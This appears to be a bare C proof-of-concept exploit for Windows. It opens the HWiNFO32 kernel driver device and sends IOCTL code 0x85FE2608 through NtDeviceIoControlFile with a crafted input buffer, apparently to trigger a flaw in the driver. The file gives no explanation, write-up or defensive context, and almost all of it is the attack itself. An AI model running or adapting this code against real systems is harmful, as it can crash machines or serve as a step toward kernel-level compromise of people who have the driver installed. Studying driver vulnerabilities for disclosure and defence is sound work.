#include<stdio.h>
#include <windows.h>
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    } DUMMYUNIONNAME;
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef NTSTATUS(NTAPI* NtDeviceIoControlFile)(
    HANDLE           FileHandle,
    HANDLE           Event,
    PVOID            ApcRoutine,
    PVOID            ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG            IoControlCode,
    PVOID            InputBuffer,
    ULONG            InputBufferLength,
    PVOID            OutputBuffer,
    ULONG            OutputBufferLength
    );
int main() {

    HANDLE hDriver = CreateFileA("\\\\.\\GLOBALROOT\\Device\\HWiNFO32", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    ULONG dw;
    if (hDriver == INVALID_HANDLE_VALUE) {
        system("pause");
        return(-1);
    }
    LPCWSTR nt = L"ntdll";
    HMODULE hntdll = GetModuleHandle(nt);
    IO_STATUS_BLOCK p = {};
    NtDeviceIoControlFile tDeviceIoControl = (NtDeviceIoControlFile)GetProcAddress((HMODULE)hntdll, "NtDeviceIoControlFile");
    if (!tDeviceIoControl) {
        printf("[-] Fail to resolve ZwDeviceIoControlFile(0x%X)\n", GetLastError());
        system("pause");
    }
    DWORD Buffer[0x20000]{};

    Buffer[0] = 1;
    Buffer[2] = 0xffff;
    tDeviceIoControl(hDriver, 0, 0, 0, &p, 0x85FE2608, Buffer, 0x10, 0, 0);
    
    return 0;
}

